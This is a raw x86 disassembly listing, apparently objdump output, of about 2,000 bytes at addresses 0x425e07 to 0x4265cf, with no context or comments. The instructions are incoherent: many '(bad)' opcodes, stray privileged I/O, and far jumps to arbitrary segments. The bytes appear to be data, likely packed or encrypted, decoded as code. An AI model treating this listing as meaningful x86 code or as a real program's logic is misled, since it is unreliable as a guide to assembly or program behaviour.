  425e07:	jl     0x425dc3
  425e09:	retf   
  425e0a:	xor    eax,0xe808518d
  425e0f:	jbe    0x425e25
  425e11:	ins    BYTE PTR es:[edi],dx
  425e12:	aaa    
  425e13:	add    edi,DWORD PTR [edx]
  425e15:	pop    ds
  425e16:	cwde   
  425e17:	ror    BYTE PTR [ecx+esi*4],1
  425e1a:	mov    cl,0x5b
  425e1c:	popa   
  425e1d:	pop    ebx
  425e1e:	fcomp  st(5)
  425e20:	pop    edi
  425e21:	(bad)  
  425e22:	dec    ebx
  425e23:	enter  0x16c2,0x11
  425e27:	adc    bl,ch
  425e29:	sub    al,bl
  425e2b:	outs   dx,BYTE PTR ds:[esi]
  425e2c:	fwait
  425e2d:	cmc    
  425e2e:	test   eax,0x28c9f032
  425e33:	bound  edx,QWORD PTR [esi-0x26]
  425e36:	inc    esp
  425e37:	jo     0x425ea3
  425e39:	push   edx
  425e3a:	mov    cl,0x43
  425e3c:	jb     0x425e55
  425e3e:	(bad)  
  425e3f:	int    0xd5
  425e41:	rol    dl,cl
  425e43:	and    eax,0xad651934
  425e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e49:	jmp    0xa603a5a9
  425e4e:	dec    BYTE PTR [ebx]
  425e50:	ds movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  425e53:	sahf   
  425e54:	xlat   BYTE PTR ds:[ebx]
  425e55:	cmp    cl,al
  425e57:	push   ss
  425e58:	aad    0x6e
  425e5a:	xchg   ebp,eax
  425e5b:	xor    bl,dl
  425e5d:	sti    
  425e5e:	dec    esi
  425e5f:	daa    
  425e60:	lods   eax,DWORD PTR ds:[esi]
  425e61:	add    ebx,eax
  425e63:	push   ecx
  425e64:	sbb    DWORD PTR [esi+0x11],esp
  425e67:	ret    0x381b
  425e6a:	dec    edx
  425e6b:	mov    bh,0x85
  425e6d:	test   DWORD PTR [esi],ebp
  425e6f:	jae    0x425e7d
  425e71:	pop    es
  425e72:	daa    
  425e73:	mov    edi,0xd15f04aa
  425e78:	cs mov ah,0x0
  425e7b:	and    eax,0xe0484b5b
  425e80:	ss inc eax
  425e82:	mov    ah,0xb2
  425e84:	inc    edx
  425e85:	int3   
  425e86:	dec    ecx
  425e87:	aas    
  425e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e89:	inc    edi
  425e8a:	mov    bl,BYTE PTR [edx*1-0x74ccac30]
  425e91:	push   0xf2403b68
  425e96:	les    ebx,FWORD PTR [esi-0x2fa11578]
  425e9c:	adc    al,0x70
  425e9e:	mov    ds:0x4b878e4,eax
  425ea3:	xchg   esp,eax
  425ea4:	retf   
  425ea5:	mov    dh,0xed
  425ea7:	cmp    BYTE PTR [eax-0x4ba2ac39],0xac
  425eae:	rcl    DWORD PTR [edi*4-0x3d3ebb8f],0x85
  425eb6:	shr    dl,1
  425eb8:	mov    WORD PTR [ebx-0x16],es
  425ebb:	ins    DWORD PTR es:[edi],dx
  425ebc:	(bad)  [esi-0x13fa5c2c]
  425ec2:	add    al,BYTE PTR ds:0xf89a77b7
  425ec8:	or     edx,DWORD PTR [edi]
  425eca:	xchg   esi,eax
  425ecb:	push   ss
  425ecc:	pop    esp
  425ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ece:	push   ebp
  425ecf:	mov    edx,ebx
  425ed1:	dec    edx
  425ed2:	mov    ds,WORD PTR [ebp+0x1ad942db]
  425ed8:	adc    ecx,ebx
  425eda:	xlat   BYTE PTR ds:[ebx]
  425edb:	sub    bh,BYTE PTR [ecx-0x60]
  425ede:	es sub ch,0x5d
  425ee2:	mov    ebx,0x5f146f80
  425ee7:	inc    esp
  425ee8:	shl    DWORD PTR [esi-0x616dd7f3],1
  425eee:	sbb    eax,0x7cbb61c5
  425ef3:	mov    ds:0xaa6669b9,eax
  425ef8:	add    BYTE PTR [edx],al
  425efa:	out    0x8d,al
  425efc:	out    0x8a,al
  425efe:	(bad)  
  425f00:	lea    ebx,[ebx+0x5b]
  425f03:	or     DWORD PTR [eax-0x18],0x1
  425f07:	jmp    0x13427305
  425f0c:	test   DWORD PTR [ebx-0x25],ecx
  425f0f:	repnz xchg ecx,eax
  425f11:	inc    esp
  425f12:	add    BYTE PTR [esi+0x35b0142f],bh
  425f18:	jne    0x425eb9
  425f1a:	xor    al,0xdb
  425f1c:	xchg   BYTE PTR [edx+0x4ca17c5b],cl
  425f22:	cmp    al,0x8d
  425f24:	add    esi,DWORD PTR ds:0x976d04cb
  425f2a:	dec    edx
  425f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f2c:	xor    eax,0x29bcf736
  425f31:	inc    eax
  425f32:	sbb    ebp,DWORD PTR [edx-0x270c08ca]
  425f38:	sub    BYTE PTR [eax+0x48],ah
  425f3b:	mov    ds:0x20db681,eax
  425f40:	sub    al,0x20
  425f42:	(bad)  
  425f43:	out    dx,al
  425f44:	jecxz  0x425f16
  425f46:	jnp    0x425efc
  425f48:	cs mov ch,0x46
  425f4b:	fcomp  QWORD PTR [esi-0x381f3b05]
  425f51:	jle    0x425f07
  425f53:	sub    eax,0x5626f244
  425f58:	gs xchg edi,eax
  425f5a:	and    BYTE PTR [esi+0x142d51b6],0x76
  425f61:	pop    ebx
  425f62:	add    edx,DWORD PTR [esi]
  425f64:	ficom  DWORD PTR [edx-0x3ea892e5]
  425f6a:	retf   
  425f6b:	pop    es
  425f6c:	sub    esi,DWORD PTR [edx-0x56]
  425f6f:	jnp    0x425faa
  425f71:	mov    dh,0xb6
  425f73:	ins    DWORD PTR es:[edi],dx
  425f74:	mov    edi,0x8605fb56
  425f79:	lds    esp,FWORD PTR [eax+0x2011ae05]
  425f7f:	shl    BYTE PTR [edx+0x49b6ddad],1
  425f85:	or     BYTE PTR [edi-0x61a39f8d],ah
  425f8b:	sub    DWORD PTR [ebx-0x74e927e0],edi
  425f91:	hlt    
  425f92:	ds test eax,ecx
  425f95:	cmp    BYTE PTR [esi+0xf1b0bb5],al
  425f9b:	adc    al,dl
  425f9d:	and    al,0x4b
  425f9f:	xchg   esp,eax
  425fa0:	es mov al,0xef
  425fa3:	fdivr  QWORD PTR [edx]
  425fa5:	sub    ch,BYTE PTR [esi]
  425fa7:	rcl    DWORD PTR [edx+0x9],1
  425faa:	out    dx,eax
  425fab:	xchg   edx,eax
  425fac:	bound  esi,QWORD PTR [eax+0x1da0e801]
  425fb2:	add    BYTE PTR [ebx+0x1c],ch
  425fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fb6:	fmul   QWORD PTR [edi]
  425fb8:	push   ss
  425fb9:	mov    dh,0xad
  425fbb:	pop    ebp
  425fbc:	fchs   
  425fbe:	xor    al,0x47
  425fc0:	xchg   ebp,eax
  425fc1:	mov    WORD PTR [ebx-0x3d7b1427],?
  425fc7:	adc    dl,BYTE PTR [edi-0x34cab7ca]
  425fcd:	mov    dh,0x41
  425fcf:	mov    ds:0xda02f43d,eax
  425fd4:	lea    ecx,[ebp-0x6bd230a3]
  425fda:	in     eax,0x20
  425fdc:	dec    ebx
  425fdd:	in     eax,dx
  425fde:	(bad)  
  425fdf:	(bad)  
  425fe0:	or     esp,ebp
  425fe2:	push   esi
  425fe3:	sbb    BYTE PTR [edi+0x18],ah
  425fe6:	and    BYTE PTR ds:0x6c2d2ef1,al
  425fec:	or     esi,DWORD PTR [eax+0x5d]
  425fef:	sub    al,0xf5
  425ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ff2:	mov    DWORD PTR [ecx-0x6d],0xba023512
  425ff9:	stos   BYTE PTR es:[edi],al
  425ffa:	cli    
  425ffb:	jb     0x425ffb
  425ffd:	mov    ah,0x10
  425fff:	adc    al,0x6e
  426001:	or     eax,0xb9e86b61
  426006:	ja     0x425fd8
  426008:	add    al,0x71
  42600a:	mov    eax,ds:0x81b32e4a
  42600f:	rcr    DWORD PTR [edx],0x85
  426012:	test   DWORD PTR [ebp+0x2cdfcdcd],ecx
  426018:	push   ds
  426019:	dec    ecx
  42601a:	push   edx
  42601b:	jl     0x426093
  42601d:	mov    cl,0x54
  42601f:	pop    eax
  426020:	mov    al,ds:0xfa64b00a
  426025:	clc    
  426026:	jg     0x425fca
  426028:	and    esp,eax
  42602a:	mov    dh,0x39
  42602c:	ficom  DWORD PTR [ebx+0x4]
  42602f:	je     0x425ff3
  426031:	jbe    0x425fe4
  426033:	mov    cl,0x50
  426035:	or     DWORD PTR ds:0x1e73d80,0xb0b6e2a3
  42603f:	test   al,0x23
  426041:	mov    ch,0xfd
  426043:	cmp    esi,DWORD PTR [edx+0x16]
  426046:	adc    DWORD PTR [edx],eax
  426048:	fisubr DWORD PTR [esi-0x6f]
  42604b:	lods   eax,DWORD PTR ds:[esi]
  42604c:	or     bl,BYTE PTR [edi-0x7692d29e]
  426052:	jbe    0x4260bf
  426054:	fcom   DWORD PTR [edi-0x55350dc8]
  42605a:	adc    edi,DWORD PTR [ebp-0x2f]
  42605d:	and    al,bl
  42605f:	outs   dx,BYTE PTR ds:[esi]
  426060:	xchg   BYTE PTR [esp+ebp*4-0x371071ad],bh
  426067:	push   edi
  426068:	adc    bl,BYTE PTR [ebx+0x29]
  42606b:	push   0x2
  42606d:	xchg   ebx,eax
  42606e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42606f:	cmp    ecx,esi
  426071:	pop    es
  426072:	xchg   al,ah
  426074:	rol    dl,cl
  426076:	push   cs
  426077:	push   ss
  426078:	mov    ds:0xc5e23be3,al
  42607d:	sub    ch,0x46
  426080:	pop    ss
  426081:	or     al,0x60
  426083:	mov    ah,0x5c
  426085:	and    cl,ch
  426087:	cmp    al,0x68
  426089:	mov    ebp,DWORD PTR [ebp+0x30936709]
  42608f:	cmp    eax,0xd6db83c0
  426094:	push   esi
  426095:	mov    DWORD PTR [eax-0x33],esi
  426098:	fucomp st(3)
  42609a:	mov    ch,bl
  42609c:	cmp    eax,0xa8a6b637
  4260a1:	push   eax
  4260a2:	xchg   ecx,eax
  4260a3:	and    esp,ebx
  4260a5:	imul   edx,ebp,0x8055e989
  4260ab:	sub    ch,BYTE PTR [edi+ebp*8-0x71]
  4260af:	sub    edi,DWORD PTR [ebx+ebx*1-0x49]
  4260b3:	add    dh,BYTE PTR [eax+eiz*4+0x4874efa9]
  4260ba:	sub    edx,DWORD PTR [esi+eax*2+0x20]
  4260be:	bound  eax,QWORD PTR [ebx]
  4260c0:	add    BYTE PTR [edx],ch
  4260c2:	jle    0x426101
  4260c4:	inc    edi
  4260c5:	jo     0x426122
  4260c7:	call   0x4b8ef05d
  4260cc:	sbb    eax,0xb68860f7
  4260d1:	test   DWORD PTR [ebp+0xa6f4e0a],eax
  4260d7:	sbb    DWORD PTR [edx+0x6b6ab64b],edx
  4260dd:	pop    ss
  4260de:	(bad)
  4260e2:	xor    bl,BYTE PTR [ecx-0x48b414f0]
  4260e8:	push   edx
  4260e9:	shl    dh,1
  4260eb:	shl    BYTE PTR [esi+ebx*1-0x5d],0x23
  4260f0:	sbb    ah,BYTE PTR [ebx+0xb6b7689]
  4260f6:	add    ah,BYTE PTR [ebp+0x34]
  4260f9:	mov    DWORD PTR [esi],edx
  4260fb:	or     BYTE PTR [eax+0x2],cl
  4260fe:	push   0x23b2428d
  426103:	pop    ss
  426104:	in     eax,0x5b
  426106:	fistp  DWORD PTR [eax-0x2]
  426109:	cmp    eax,DWORD PTR [edx+0x52]
  42610c:	cmp    eax,ebp
  42610e:	pop    ebp
  42610f:	hlt    
  426110:	add    BYTE PTR [eax],bl
  426112:	sbb    dl,ah
  426114:	push   esp
  426115:	sar    BYTE PTR [ebp+0x31],0x94
  426119:	in     eax,0x94
  42611b:	jno    0x426186
  42611d:	fcmovnu st,st(0)
  42611f:	lds    esi,FWORD PTR [edx+0xd02cc2a]
  426125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426126:	out    dx,eax
  426127:	push   esp
  426128:	push   edx
  426129:	sub    al,0x94
  42612b:	outs   dx,DWORD PTR ds:[esi]
  42612c:	mov    cl,BYTE PTR [eax-0x59144700]
  426132:	adc    DWORD PTR [ebx-0x3d2495d8],esp
  426138:	jg     0x426104
  42613a:	cwde   
  42613b:	xchg   ebp,eax
  42613c:	jp     0x426176
  42613e:	ins    DWORD PTR es:[edi],dx
  42613f:	fcmovnb st,st(6)
  426141:	push   esi
  426142:	clc    
  426143:	pop    esp
  426144:	addr16 int3 
  426146:	out    0xaa,al
  426148:	mov    ds:0xb45eb5c,al
  42614d:	push   eax
  42614e:	mov    ebx,0xb9f7f280
  426153:	clc    
  426154:	add    DWORD PTR [ebx+0x55],ebp
  426157:	mov    ch,0x4d
  426159:	and    al,0xb4
  42615b:	or     al,0xf2
  42615d:	pop    es
  42615e:	dec    ebp
  42615f:	adc    eax,DWORD PTR [edi+esi*4]
  426162:	jbe    0x426154
  426164:	and    bl,dl
  426166:	or     ebx,DWORD PTR [esi+0x28]
  426169:	fidiv  WORD PTR [ecx+0x3b5736dd]
  42616f:	in     eax,0xb3
  426171:	mov    dl,al
  426173:	ss jb  0x4261cf
  426176:	jne    0x426113
  426178:	push   0xffffffdb
  42617a:	adc    DWORD PTR [eax-0x6f76daf8],edi
  426180:	adc    DWORD PTR [edx+0x6d85d097],ecx
  426186:	imul   ebx,ebp,0x17
  426189:	daa    
  42618a:	push   ebx
  42618b:	lock or eax,0xaaea5c31
  426191:	mov    eax,0x1a08bc
  426196:	cmp    bl,BYTE PTR es:[ebp-0x5c8a4dc1]
  42619d:	jo     0x4261fa
  42619f:	lods   eax,DWORD PTR ds:[esi]
  4261a0:	sbb    al,0x3b
  4261a2:	push   edx
  4261a3:	jno    0x42618a
  4261a5:	stos   DWORD PTR es:[edi],eax
  4261a6:	ja     0x426213
  4261a8:	retf   
  4261a9:	mov    edi,0xf92c7db0
  4261ae:	enter  0xa9a9,0xc3
  4261b2:	hlt    
  4261b3:	add    BYTE PTR [ecx-0x59f4ff84],bl
  4261b9:	mov    fs,WORD PTR [edx-0x2f6b52f5]
  4261bf:	push   ebp
  4261c0:	(bad)  
  4261c1:	dec    ebp
  4261c2:	(bad)  
  4261c3:	(bad)  
  4261c5:	lea    eax,[ebp+0x97abb96]
  4261cb:	(bad)  
  4261cc:	dec    ebx
  4261cd:	or     eax,DWORD PTR [esi+esi*4+0x4]
  4261d1:	lock loope 0x4261aa
  4261d4:	push   esp
  4261d5:	cmp    eax,0x25536be9
  4261da:	(bad)  
  4261db:	aad    0x5e
  4261dd:	fwait
  4261de:	sub    BYTE PTR [esi+0x11],dh
  4261e1:	sub    edx,DWORD PTR ds:0xbb414d0b
  4261e7:	add    BYTE PTR [edi],dl
  4261e9:	xchg   esi,eax
  4261ea:	push   0x1a
  4261ec:	ins    BYTE PTR es:[edi],dx
  4261ed:	push   0x36c7e149
  4261f2:	fimul  DWORD PTR [esi-0x4838bc26]
  4261f8:	add    ecx,DWORD PTR [edi]
  4261fa:	sti    
  4261fb:	sbb    BYTE PTR [ebx],0x89
  4261fe:	xor    BYTE PTR [esi+0x44],0xdc
  426202:	outs   dx,BYTE PTR ds:[esi]
  426203:	out    0x86,eax
  426205:	sbb    al,0xed
  426207:	ffree  st(1)
  426209:	add    eax,0x49b09a16
  42620e:	cmp    eax,0x87fb3fb8
  426213:	mov    dh,0x1b
  426215:	pop    ebx
  426216:	push   edi
  426217:	(bad)  
  426218:	fsubr  DWORD PTR [esi-0x6c]
  42621b:	mov    ds:0x1bf5922d,al
  426220:	mov    al,ds:0xf229add
  426225:	sub    BYTE PTR [ebx],cl
  426227:	je     0x4261aa
  426229:	pop    edi
  42622a:	or     DWORD PTR [edx-0x6995f493],eax
  426230:	das    
  426231:	rcl    edx,cl
  426233:	mov    bh,0x6d
  426235:	imul   esp,DWORD PTR [ecx+0x3b91c149],0x68b97aee
  42623f:	pusha  
  426240:	xor    DWORD PTR ds:0x1305135b,eax
  426246:	in     al,0x5
  426248:	repnz pop es
  42624a:	outs   dx,BYTE PTR ds:[esi]
  42624b:	or     eax,0x53f2b5aa
  426250:	push   ebp
  426251:	sti    
  426252:	xor    BYTE PTR [ecx],al
  426254:	or     ebp,DWORD PTR [ecx+edx*1]
  426257:	sahf   
  426258:	rcl    DWORD PTR [ecx-0x21],1
  42625b:	jno    0x4262b8
  42625d:	push   ss
  42625e:	push   0x1b
  426260:	sub    DWORD PTR [ecx-0x40057c4d],esp
  426266:	(bad)  
  426267:	rcl    BYTE PTR [edx+0x3],cl
  42626a:	pop    eax
  42626b:	add    dl,cl
  42626d:	inc    esi
  42626e:	bound  edi,QWORD PTR [eax]
  426270:	adc    BYTE PTR [ebp+0x6b],dh
  426273:	sbb    edx,DWORD PTR [esi-0x51f7fd1e]
  426279:	push   edx
  42627a:	fdivr  DWORD PTR [edx+0x38c9d880]
  426280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426281:	cmp    eax,0x6bbe9e83
  426286:	pop    ss
  426287:	or     dl,BYTE PTR [edi+0x16a4e3d]
  42628d:	mov    ss,WORD PTR [edx-0x25f4a969]
  426293:	(bad)  
  426294:	ret    0x8b72
  426297:	pop    es
  426298:	jle    0x4262e9
  42629a:	ss es mov cl,0x95
  42629e:	jbe    0x426309
  4262a0:	mov    eax,ds:0x7ab262dd
  4262a5:	dec    edx
  4262a6:	cli    
  4262a7:	(bad)  
  4262a8:	stos   BYTE PTR es:[edi],al
  4262a9:	jecxz  0x4262e4
  4262ab:	inc    edi
  4262ac:	(bad)  
  4262ad:	dec    esi
  4262ae:	ins    BYTE PTR es:[edi],dx
  4262af:	fisttp DWORD PTR [edx]
  4262b1:	jno    0x426281
  4262b3:	cwde   
  4262b4:	jmp    0x42626e
  4262b6:	stc    
  4262b7:	in     al,dx
  4262b8:	outs   dx,BYTE PTR ds:[esi]
  4262b9:	or     eax,0x7366c2d1
  4262be:	jge    0x4262d3
  4262c0:	shr    BYTE PTR [edi],0x3c
  4262c3:	(bad)  
  4262c4:	mov    dh,0x16
  4262c6:	mov    cl,0xd5
  4262c8:	ja     0x4262b2
  4262ca:	out    dx,eax
  4262cb:	dec    edi
  4262cc:	pop    ss
  4262cd:	in     al,0x5b
  4262cf:	pop    ss
  4262d0:	add    eax,0xc3f12d37
  4262d5:	or     ecx,eax
  4262d7:	xor    eax,0x2c2e82a2
  4262dc:	ins    BYTE PTR es:[edi],dx
  4262dd:	(bad)  [ecx+esi*8-0x62]
  4262e1:	mov    BYTE PTR [ebx+0x44],bh
  4262e4:	mov    bh,0x85
  4262e6:	jbe    0x426353
  4262e8:	pop    ebp
  4262e9:	pusha  
  4262ea:	and    BYTE PTR [edi-0x6d],al
  4262ed:	jge    0x42633b
  4262ef:	adc    DWORD PTR [esi],ecx
  4262f1:	mov    eax,ds:0xe1500b62
  4262f6:	adc    edx,DWORD PTR [edi-0x6de974c8]
  4262fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262fd:	fidiv  DWORD PTR [esi]
  4262ff:	push   ss
  426300:	sbb    ch,BYTE PTR [ecx+ebp*4+0x57]
  426304:	xchg   DWORD PTR [eax],esi
  426306:	and    cl,bh
  426308:	shl    DWORD PTR [esi],1
  42630a:	pop    edx
  42630b:	add    edx,esi
  42630d:	cmp    ecx,DWORD PTR [ebx-0x25]
  426310:	and    al,0x2e
  426312:	ins    BYTE PTR es:[edi],dx
  426313:	or     ecx,DWORD PTR [ebp-0x6e]
  426316:	adc    DWORD PTR [ebp+eiz*4-0x53],ecx
  42631a:	mov    WORD PTR [eax],ss
  42631c:	push   ds
  42631d:	mov    esp,0xd542c415
  426322:	and    esi,DWORD PTR [esp+ebp*1-0x5e]
  426326:	test   DWORD PTR [esi],edx
  426328:	ror    BYTE PTR [edi],1
  42632a:	jle    0x42633b
  42632c:	loop   0x4263a5
  42632e:	stos   BYTE PTR es:[edi],al
  42632f:	or     DWORD PTR [edx+0x67f44e55],edi
  426335:	fwait
  426336:	rcr    BYTE PTR [esi],cl
  426338:	fdivr  DWORD PTR [edx]
  42633a:	or     BYTE PTR [eax+0x6c],ch
  42633d:	(bad)  
  42633e:	xchg   esi,eax
  42633f:	sub    BYTE PTR [ebx-0x5],ch
  426342:	imul   esp,DWORD PTR [ebx-0x55],0xffffffdd
  426346:	cmp    BYTE PTR [esi],0x79
  426349:	aam    0xe2
  42634b:	xchg   esp,eax
  42634c:	ret    
  42634d:	xor    dh,cl
  42634f:	aam    0xa1
  426351:	(bad)  [edi+0x7a]
  426354:	aas    
  426355:	shr    DWORD PTR [esi+0x47],1
  426358:	sti    
  426359:	mov    ebp,0xdb85821d
  42635e:	adc    dh,BYTE PTR [ecx+0x68]
  426361:	stos   BYTE PTR es:[edi],al
  426362:	sar    edx,1
  426364:	pop    esi
  426365:	dec    BYTE PTR [eax]
  426367:	clc    
  426368:	aad    0x86
  42636a:	inc    esi
  42636b:	lods   al,BYTE PTR ds:[esi]
  42636c:	dec    ebx
  42636d:	adc    al,0x23
  42636f:	sti    
  426370:	pop    esp
  426371:	fdiv   DWORD PTR [esi]
  426373:	mov    edx,0x97ebe55
  426378:	pop    ecx
  426379:	inc    edx
  42637a:	cmp    al,BYTE PTR [ebx-0x31]
  42637d:	sbb    DWORD PTR [edx-0x60],0x68
  426381:	leave  
  426382:	cs imul ah
  426385:	push   ebp
  426386:	mov    ch,0xb1
  426388:	mov    al,0x16
  42638a:	shl    BYTE PTR [esi-0x48],0x3c
  42638e:	inc    edx
  42638f:	cs ins DWORD PTR es:[edi],dx
  426391:	sub    al,0xd1
  426393:	jbe    0x4263cc
  426395:	pop    eax
  426396:	leave  
  426397:	xchg   esi,eax
  426398:	cdq    
  426399:	imul   ecx,DWORD PTR [edi],0x38
  42639c:	jo     0x4263f9
  42639e:	mov    esi,0x6eb97915
  4263a3:	jge    0x4263a5
  4263a5:	dec    esp
  4263a6:	pop    ebx
  4263a7:	mov    al,0xca
  4263a9:	icebp  
  4263aa:	push   ss
  4263ab:	ss mov dh,0xad
  4263ae:	jl     0x42633f
  4263b0:	call   0x7194:0xf38d6280
  4263b7:	pop    eax
  4263b8:	push   0xbc02d8dc
  4263bd:	cdq    
  4263be:	jg     0x4263fa
  4263c0:	lock dec edi
  4263c2:	call   0x5defec9c
  4263c7:	out    dx,al
  4263c8:	popf   
  4263c9:	add    ah,bl
  4263cb:	pop    esp
  4263cc:	pop    ebx
  4263cd:	inc    edi
  4263ce:	lods   eax,DWORD PTR ds:[esi]
  4263cf:	lods   eax,DWORD PTR ds:[esi]
  4263d0:	adc    BYTE PTR [ecx-0x400d794e],dh
  4263d6:	test   al,0x9a
  4263d8:	mov    dh,0xd6
  4263da:	inc    ebp
  4263db:	stc    
  4263dc:	dec    esi
  4263dd:	jmp    0x2350:0xf6058600
  4263e4:	(bad)  [edx+0x74]
  4263e7:	add    al,0xb0
  4263e9:	fisttp QWORD PTR [esi]
  4263eb:	mov    fs,WORD PTR [edi]
  4263ed:	das    
  4263ee:	jno    0x4263ae
  4263f0:	in     al,0x50
  4263f2:	mov    esp,DWORD PTR [edx+0x6cf74c11]
  4263f8:	add    ah,BYTE PTR [edx-0x45]
  4263fb:	sahf   
  4263fc:	mov    ch,0x9a
  4263fe:	xchg   edx,eax
  4263ff:	ins    BYTE PTR es:[edi],dx
  426400:	mov    DWORD PTR [eax],ebp
  426402:	pop    edi
  426403:	fidiv  DWORD PTR [esi-0x5d]
  426406:	ins    BYTE PTR es:[edi],dx
  426407:	stc    
  426408:	xor    eax,0x1130136f
  42640d:	push   edi
  42640e:	pop    esp
  42640f:	fcmovnb st,st(2)
  426411:	test   DWORD PTR ds:0xceb8bf59,ecx
  426417:	aaa    
  426418:	jae    0x426455
  42641a:	cmp    esi,eax
  42641c:	jne    0x42642e
  42641e:	ins    DWORD PTR es:[edi],dx
  42641f:	pop    ebx
  426420:	call   0x7c:0x89844aaa
  426427:	mov    eax,0xf25fb0b1
  42642c:	mov    BYTE PTR [ecx],dl
  42642e:	inc    edx
  42642f:	cmp    eax,0x41d4b1b8
  426434:	in     eax,dx
  426435:	lea    eax,[esi]
  426437:	ds ret 0xfefb
  42643b:	xor    eax,0xb442dadb
  426440:	push   es
  426441:	xor    esi,DWORD PTR [edx-0x4a04912]
  426447:	jecxz  0x4264b5
  426449:	pop    ebx
  42644a:	push   ebx
  42644b:	jno    0x4264b3
  42644d:	and    ch,BYTE PTR [ecx+0x32568371]
  426453:	dec    edx
  426454:	pop    ss
  426455:	sbb    ah,BYTE PTR [eax+0x4afc2a6e]
  42645b:	pop    eax
  42645c:	jmp    0x58db:0x712dd6f7
  426463:	push   0xfc6534bc
  426468:	inc    edx
  426469:	dec    BYTE PTR [eax]
  42646b:	(bad)  
  42646c:	arpl   bx,ax
  42646e:	(bad)  
  42646f:	imul   BYTE PTR ds:0x6400263b
  426475:	jmp    edi
  426477:	sub    eax,0x6dd5322b
  42647c:	mov    dh,0x74
  42647e:	xor    DWORD PTR [edi-0x3d52d46b],ebx
  426484:	ins    DWORD PTR es:[edi],dx
  426485:	popa   
  426486:	mov    BYTE PTR [edx+0xd01d1d0],dh
  42648c:	sbb    DWORD PTR [eax-0x78],esi
  42648f:	ins    DWORD PTR es:[edi],dx
  426490:	inc    ebx
  426491:	aad    0x6d
  426493:	jae    0x4264b4
  426495:	mov    dl,0xff
  426497:	mov    eax,ds:0xb685dba1
  42649c:	xor    DWORD PTR [eax+0x1c951ff1],0x8402ed70
  4264a6:	lea    ecx,[edi+0x56cd4576]
  4264ac:	es cli 
  4264ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264af:	xor    BYTE PTR [eax+0x40c1076d],al
  4264b5:	xchg   edx,eax
  4264b6:	mov    ss,WORD PTR [ebx-0x25b719ce]
  4264bc:	test   DWORD PTR [esi+0x7eabfda9],esi
  4264c2:	aam    0x79
  4264c4:	pop    edi
  4264c5:	pop    ss
  4264c6:	xor    ah,BYTE PTR [ecx+0x5b]
  4264c9:	fdiv   DWORD PTR [esi]
  4264cb:	push   es
  4264cc:	pop    edx
  4264cd:	retf   
  4264ce:	clc    
  4264cf:	pop    esi
  4264d0:	or     edx,DWORD PTR [esi-0x73]
  4264d3:	fdiv   QWORD PTR [esi]
  4264d5:	fisubr DWORD PTR [ebp-0x4cf5fa8a]
  4264db:	bound  edx,QWORD PTR fs:[eax+0x76]
  4264df:	jnp    0x426462
  4264e1:	add    al,bl
  4264e3:	add    al,0xdd
  4264e5:	fwait
  4264e6:	iret   
  4264e7:	pop    esp
  4264e8:	add    al,al
  4264ea:	je     0x426491
  4264ec:	lods   eax,DWORD PTR ds:[esi]
  4264ed:	ins    DWORD PTR es:[edi],dx
  4264ee:	sbb    eax,DWORD PTR [ebp-0x13]
  4264f1:	push   cs
  4264f2:	sub    DWORD PTR [edx-0x5b2e28ad],eax
  4264f8:	jo     0x426525
  4264fa:	fcom   QWORD PTR [esi-0x5004c74a]
  426500:	enter  0x1479,0xa2
  426504:	push   es
  426505:	sub    ch,0xd6
  426508:	inc    ebp
  426509:	mov    dh,0x28
  42650b:	or     BYTE PTR [ebx+0x1de681],0x9a
  426512:	fcomp  DWORD PTR [edx]
  426514:	leave  
  426515:	xor    al,0xf8
  426517:	in     eax,dx
  426518:	sub    BYTE PTR [ecx-0x2f],dl
  42651b:	add    cl,al
  42651d:	mov    al,es:0xaec50ca4
  426523:	add    esp,DWORD PTR [eax-0x47]
  426526:	mov    ch,0x69
  426528:	sbb    esp,DWORD PTR [eax-0x7e286568]
  42652e:	shl    DWORD PTR [esi-0x647c55f3],1
  426534:	add    eax,0x54f5b698
  426539:	mov    ds:0xe1bba86,al
  42653e:	loop   0x426550
  426540:	sub    ecx,edi
  426542:	push   esi
  426543:	fmul   DWORD PTR [eax+0x1cdbdd0a]
  426549:	jmp    0x42650d
  42654b:	call   0x6714:0x56db6e20
  426552:	pop    esp
  426553:	fbstp  TBYTE PTR [ebp+0x10]
  426556:	adc    esi,0x9edc6c44
  42655c:	mov    ecx,0x478aa2a5
  426561:	scas   al,BYTE PTR es:[edi]
  426562:	jp     0x426505
  426564:	fstp   QWORD PTR [edx]
  426566:	loopne 0x42654d
  426568:	jnp    0x426540
  42656a:	push   0xffffff86
  42656c:	bound  ecx,QWORD PTR [ebp-0x5277832c]
  426572:	jo     0x4265df
  426574:	loop   0x42658c
  426576:	dec    edx
  426577:	push   ds
  426578:	jae    0x426536
  42657a:	inc    edi
  42657b:	aad    0x1
  42657d:	xor    al,0x34
  42657f:	pop    edx
  426580:	sub    ebp,edi
  426582:	imul   ecx,DWORD PTR [edi],0x7
  426585:	aad    0x42
  426587:	test   eax,0x91a9fda9
  42658c:	pop    esi
  42658d:	or     ah,BYTE PTR [edx-0x15]
  426590:	inc    esi
  426591:	inc    esp
  426592:	lahf   
  426593:	add    DWORD PTR [ecx],esp
  426595:	retf   0xdb80
  426598:	ret    0xeb6d
  42659b:	mov    ds:0xd70444d1,al
  4265a0:	loop   0x426525
  4265a2:	mov    al,ds:0x200f2670
  4265a7:	push   ss
  4265a8:	fiadd  DWORD PTR [esi]
  4265aa:	cmp    BYTE PTR [ebx-0x204f50a1],ah
  4265b0:	cs xchg esp,eax
  4265b2:	push   ss
  4265b3:	xchg   DWORD PTR [esi],esi
  4265b5:	es jg  0x426551
  4265b8:	sub    eax,0x6800371d
  4265bd:	rcl    BYTE PTR [ebx],cl
  4265bf:	mov    ch,0xb1
  4265c1:	sub    eax,0x9f4005eb
  4265c6:	or     DWORD PTR [edx],ecx
  4265c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265c9:	push   0xfffffff9
  4265cb:	inc    edx
  4265cc:	mov    cl,0x22
  4265ce:	push   es
  4265cf:	popf   
